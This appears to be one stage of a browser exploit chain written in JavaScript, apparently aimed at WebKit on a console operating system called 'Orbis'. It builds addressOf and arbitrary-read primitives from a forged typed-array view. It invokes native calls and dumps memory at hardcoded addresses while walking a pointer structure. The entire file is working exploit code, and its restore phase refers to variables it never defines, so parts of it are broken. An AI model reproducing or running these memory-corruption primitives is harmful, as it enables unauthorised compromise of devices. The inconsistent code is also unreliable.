// Orbis walk, v2: follow the root structure's pointer web. Targets from
// walk v1 (capture 37d3cca4): +0x38 → 0x12AB42C0, +0x40 → 0x12AB4368,
// +0x48 → 0x12AB43A8 (data sub-structs), +0x70 → 0x12AB8070 (near-self),
// and +0x78 → 0x09CA7E28 (cross-region — different segment, highest
// interest). Each read: 192 bytes. All read-only; safe mark() helper.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  function toAscii(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
      var ch = bytes[i];
      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : ".";
    }
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("orbis2_preflight");
  phase = "reads";
  var sub38 = toHex(readAt(0x12ab42c0, 192));
  var sub40 = toHex(readAt(0x12ab4368, 192));
  var sub48 = toHex(readAt(0x12ab43a8, 192));
  var crossBytes = readAt(0x09ca7e28, 192);
  var crossHex = toHex(crossBytes);
  var crossAscii = toAscii(crossBytes);
  var near70 = toHex(readAt(0x12ab8070, 192));
  mark("orbis2_reads_done");
  phase = "restore";
  for (var r = 0; r < original.length; r++)
    frame[bufOffset + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[bufOffset + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  mark("orbis2_done");
  result = { id: "orbis_walk_v2",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { sub_38_head: sub38.slice(0, 128),
      sub_40_head: sub40.slice(0, 128),
      sub_48_head: sub48.slice(0, 128),
      cross_head: crossHex.slice(0, 128),
      cross_ascii: crossAscii.slice(0, 200),
      cross_more_hex: crossHex.slice(128, 380),
      near_70_head: near70.slice(0, 128),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "orbis_walk_v2", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
